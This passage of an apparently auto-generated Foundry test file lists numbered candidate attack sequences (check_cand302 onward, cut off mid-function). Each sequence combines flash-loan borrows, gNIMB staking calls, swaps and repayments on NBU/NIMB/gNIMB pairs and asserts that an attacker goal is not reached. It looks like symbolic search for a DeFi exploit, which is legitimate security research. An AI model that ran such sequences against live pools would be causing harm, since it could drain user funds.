        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand303(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand304(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand305(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand306(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand307(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand308(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand309(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand310(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand311(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand312(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand313(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand314(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand315(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand316(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand317(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand318(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand319(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand320(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand321(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand322(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand323(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand324(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand325(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand326(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand327(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand328(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand329(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand330(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand331(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand332(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand333(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand334(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand335(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand336(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand337(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand338(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand339(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand340(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand341(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand342(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand343(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand344(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand345(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand346(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand347(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand348(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand349(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand350(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand351(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand352(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand353(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand354(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand355(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand356(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand357(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand358(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand359(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand360(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand361(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand362(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
